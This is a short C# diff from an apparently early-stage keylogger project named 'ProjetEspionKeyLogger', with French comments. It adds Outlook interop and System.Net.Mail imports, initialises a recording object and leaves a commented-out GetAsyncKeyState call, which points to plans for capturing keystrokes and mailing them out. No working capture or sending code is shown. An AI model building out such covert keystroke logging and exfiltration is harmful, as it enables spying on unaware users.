@@ -5,6 +5,9 @@ using System.Windows.Forms;
 using System.Drawing;
 using System.IO;
 using System.Xml.Serialization;
+using System.Runtime.InteropServices;
+using Outlook = Microsoft.Office.Interop.Outlook;
+using System.Net.Mail;
 
 namespace ProjetEspionKeyLogger
 {
@@ -18,8 +21,12 @@ namespace ProjetEspionKeyLogger
         //Constructeur(peut etre pas nécessaire)
         public KeyLogger()
         {
-            
-            
+
+            enregistrement_courrant = new Enregistrement();
+
+
+            //int test = GetAsyncKeyState(1);
+
             //Affiche la date du jour
             Console.WriteLine(enregistrement_courrant.dateTimeNow());
         }
@@ -42,6 +49,8 @@ namespace ProjetEspionKeyLogger
         {
 
         }
+
+
 
         //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
         private void Timer_Tick(object sender, EventArgs e)
